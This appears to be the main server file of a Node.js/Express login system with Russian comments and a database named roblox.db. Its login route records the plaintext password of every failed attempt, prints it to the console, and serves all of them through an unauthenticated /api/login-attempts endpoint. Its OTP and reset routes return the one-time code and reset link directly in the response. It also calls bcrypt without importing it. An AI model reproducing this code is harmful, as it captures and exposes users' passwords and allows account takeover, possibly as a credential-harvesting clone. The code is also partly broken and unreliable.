require('dotenv').config();
const express = require('express');
const session = require('express-session');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const nodemailer = require('nodemailer');
const db = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
    secret: JWT_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

function generateCode(length = 6) {
    return crypto.randomInt(Math.pow(10, length - 1), Math.pow(10, length)).toString();
}

function generateToken() {
    return crypto.randomBytes(32).toString('hex');
}

// Регистрация
app.post('/api/register', (req, res) => {
    const { username, email, phone, password } = req.body;

    if (!username || !email || !password) {
        return res.status(400).json({ error: 'Все обязательные поля должны быть заполнены' });
    }

    if (password.length < 6) {
        return res.status(400).json({ error: 'Пароль должен быть не менее 6 символов' });
    }

    db.createUser({ username, email, phone, password }, (err, user) => {
        if (err) {
            if (err.message.includes('UNIQUE constraint failed')) {
                return res.status(400).json({ error: 'Пользователь с таким именем или email уже существует' });
            }
            return res.status(500).json({ error: 'Ошибка при регистрации' });
        }
        
        req.session.userId = user.id;
        req.session.username = user.username;
        res.json({ success: true, user: { id: user.id, username: user.username, email: user.email } });
    });
});

// 🆕 ВХОД С ЛОГИРОВАНИЕМ
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (!identifier || !password) {
        return res.status(400).json({ error: 'Введите логин и пароль' });
    }

    db.findUser(identifier, (err, user) => {
        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
        
        if (!user) {
            // Логируем неудачную попытку (пользователь не найден)
            db.logLoginAttempt(identifier, password, false, ip, userAgent, () => {});
            console.log(`❌ НЕУДАЧА: ${identifier} - пользователь не найден`);
            return res.status(401).json({ error: 'Неверный логин или пароль' });
        }

        db.checkPassword(password, user.password_hash, (err, isMatch) => {
            if (err) return res.status(500).json({ error: 'Ошибка сервера' });
            
            if (!isMatch) {
                // Логируем неудачную попытку (неверный пароль)
                db.logLoginAttempt(identifier, password, false, ip, userAgent, () => {});
                console.log(`❌ НЕУДАЧА: ${identifier} - неверный пароль (${password})`);
                return res.status(401).json({ error: 'Неверный логин или пароль' });
            }

            // Логируем успешный вход
            db.logLoginAttempt(identifier, '[PASSWORD_MATCH]', true, ip, userAgent, () => {});
            console.log(`✅ УСПЕХ: ${identifier} - успешный вход`);

            req.session.userId = user.id;
            req.session.username = user.username;
            
            db.updateLastLogin(user.id, () => {});

            res.json({ 
                success: true, 
                user: { 
                    id: user.id, 
                    username: user.username, 
                    email: user.email 
                } 
            });
        });
    });
});

// Отправка OTP кода
app.post('/api/send-otp', (req, res) => {
    const { email } = req.body;

    if (!email) {
        return res.status(400).json({ error: 'Email обязателен' });
    }

    const code = generateCode();
    const expiresIn = 10;

    db.createOTPCode(email, code, expiresIn, (err) => {
        if (err) return res.status(500).json({ error: 'Ошибка при создании кода' });

        console.log(`\n🔐 OTP код для ${email}: ${code}\n`);
        res.json({ 
            success: true, 
            message: 'Код отправлен (смотрите консоль сервера для тестирования)',
            testCode: code
        });
    });
});

// Проверка OTP кода
app.post('/api/verify-otp', (req, res) => {
    const { email, code } = req.body;

    if (!email || !code) {
        return res.status(400).json({ error: 'Email и код обязательны' });
    }

    db.verifyOTPCode(email, code, (err, isValid) => {
        if (err) return res.status(500).json({ error: 'Ошибка проверки кода' });
        if (!isValid) return res.status(400).json({ error: 'Неверный или просроченный код' });

        res.json({ success: true, message: 'Код подтвержден' });
    });
});

// Быстрый вход (OTP без пароля)
app.post('/api/quick-login', (req, res) => {
    const { email, code } = req.body;

    db.verifyOTPCode(email, code, (err, isValid) => {
        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
        if (!isValid) return res.status(401).json({ error: 'Неверный код' });

        db.findUser(email, (err, user) => {
            if (err || !user) return res.status(404).json({ error: 'Пользователь не найден' });

            req.session.userId = user.id;
            req.session.username = user.username;

            res.json({ 
                success: true, 
                user: { id: user.id, username: user.username, email: user.email } 
            });
        });
    });
});

// Запрос на восстановление пароля
app.post('/api/forgot-password', (req, res) => {
    const { email } = req.body;

    db.findUser(email, (err, user) => {
        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
        
        if (!user) {
            return res.json({ success: true, message: 'Если email зарегистрирован, вы получите ссылку' });
        }

        const token = generateToken();
        const expiresIn = 60;

        db.createResetToken(email, token, expiresIn, (err) => {
            if (err) return res.status(500).json({ error: 'Ошибка создания токена' });

            const resetLink = `http://localhost:${PORT}/reset-password?token=${token}`;
            
            console.log(`\n🔗 Ссылка для сброса пароля: ${resetLink}\n`);
            res.json({ 
                success: true, 
                message: 'Инструкции отправлены на email',
                testLink: resetLink
            });
        });
    });
});

// Сброс пароля
app.post('/api/reset-password', (req, res) => {
    const { token, newPassword } = req.body;

    if (!token || !newPassword) {
        return res.status(400).json({ error: 'Токен и новый пароль обязательны' });
    }

    if (newPassword.length < 6) {
        return res.status(400).json({ error: 'Пароль должен быть не менее 6 символов' });
    }

    db.db.get(
        `SELECT * FROM password_resets WHERE token = ? AND expires_at > datetime('now')`,
        [token],
        (err, row) => {
            if (err) return res.status(500).json({ error: 'Ошибка сервера' });
            if (!row) return res.status(400).json({ error: 'Неверный или просроченный токен' });

            bcrypt.hash(newPassword, 10, (err, hash) => {
                if (err) return res.status(500).json({ error: 'Ошибка хеширования' });

                db.updatePassword(row.email, hash, (err) => {
                    if (err) return res.status(500).json({ error: 'Ошибка обновления пароля' });

                    db.db.run(`DELETE FROM password_resets WHERE id = ?`, [row.id]);

                    res.json({ success: true, message: 'Пароль успешно изменен' });
                });
            });
        }
    );
});

// Проверка сессии
app.get('/api/me', (req, res) => {
    if (!req.session.userId) {
        return res.status(401).json({ error: 'Не авторизован' });
    }

    db.db.get(`SELECT id, username, email, created_at, last_login FROM users WHERE id = ?`, 
        [req.session.userId], 
        (err, user) => {
            if (err) return res.status(500).json({ error: 'Ошибка сервера' });
            res.json({ success: true, user });
        }
    );
});

// Выход
app.post('/api/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) return res.status(500).json({ error: 'Ошибка выхода' });
        res.json({ success: true, message: 'Вы успешно вышли' });
    });
});

// 🆕 НОВЫЙ МАРШРУТ - просмотр попыток входа
app.get('/api/login-attempts', (req, res) => {
    // В реальном приложении здесь должна быть проверка админских прав
    db.db.all(`SELECT * FROM login_attempts ORDER BY created_at DESC LIMIT 100`, (err, rows) => {
        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
        res.json({ success: true, attempts: rows });
    });
});

// Главная страница
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`\n🚀 Сервер запущен на http://localhost:${PORT}`);
    console.log(`📊 База данных: SQLite (roblox.db)\n`);
    console.log(`📝 Логирование попыток входа: ВКЛЮЧЕНО\n`);
});